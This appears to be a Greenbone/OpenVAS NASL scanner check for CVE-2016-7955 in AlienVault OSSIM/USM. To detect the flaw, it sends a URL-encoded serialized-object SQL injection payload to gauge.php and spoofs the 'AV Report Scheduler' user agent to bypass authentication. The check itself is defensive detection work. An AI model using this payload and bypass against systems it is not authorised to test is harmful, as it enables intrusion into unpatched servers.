# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106617");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2017-02-23 09:39:34 +0700 (Thu, 23 Feb 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-10-09 20:00:00 +0000 (Tue, 09 Oct 2018)");
  script_cve_id("CVE-2016-7955");
  script_name("AlienVault OSSIM/USM Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_ossim_web_detect.nasl");
  script_mandatory_keys("OSSIM/installed");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/41424/");
  script_xref(name:"URL", value:"https://pentest.blog/unexpected-journey-into-the-alienvault-ossimusm-during-engagement/");

  script_tag(name:"summary", value:"AlienVault OSSIM and USM are prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP request and checks the response.");

  script_tag(name:"insight", value:"Multiple vulnerabilities like object injection, authentication bypass and
  IP spoofing, have been found in AlienVault OSSIM and AlienVault USM.");

  script_tag(name:"solution", value:"Update to 5.3.5 or newer versions.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

cpe_list = make_list("cpe:/a:alienvault:open_source_security_information_management", "cpe:/a:alienvault:unified_security_management");

if (!infos = get_app_port_from_list(cpe_list: cpe_list))
  exit(0);

CPE  = infos["cpe"];
port = infos["port"];

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

rand = rand_str(length: 15, charset:"ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz");

params = 'type=alarm&wtype=foo&asset=ALL_ASSETS&height=1&value=a%3a1%3a%7bs%3a4%3a%22type%22%3bs%3a69%3a%221%20AND%20extractvalue%28rand%28%29%2cconcat%280x3a%2c%28SELECT%20%27' + rand + '%27%29%29%29--%20%22%3b%7d';

url = dir + '/dashboard/sections/widgets/data/gauge.php?' + params;

req = http_get_req(port: port, url: url, user_agent: "AV Report Scheduler");
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && res =~ "XPATH syntax error: '" + rand) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
